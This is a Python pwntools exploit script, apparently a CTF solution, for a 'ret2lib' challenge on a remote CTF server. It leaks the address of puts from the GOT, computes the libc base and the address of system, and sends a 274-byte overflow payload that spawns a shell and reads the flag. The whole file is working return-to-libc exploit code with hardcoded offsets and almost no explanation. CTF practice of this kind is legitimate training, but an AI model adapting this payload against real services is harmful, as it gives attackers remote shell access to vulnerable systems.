#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

# p = process("./ret2lib")
p = remote("ctf.racterub.me", 3005)
# padding 274

p.recvuntil("Give me an address (in hex) :")
p.sendline("0804a020")

puts_got = int(p.readline().split(" ")[6], 16)

puts_offset = 0x5f140
libc_base = puts_got - puts_offset
system = libc_base + 0x3a940
sh = 0x80482a3

payload = cyclic(274)
payload += flat([system, "AAAA", sh])

p.recvuntil("Leave some message for me :")

p.sendline(payload)

p.sendline("cat flag")

p.interactive()
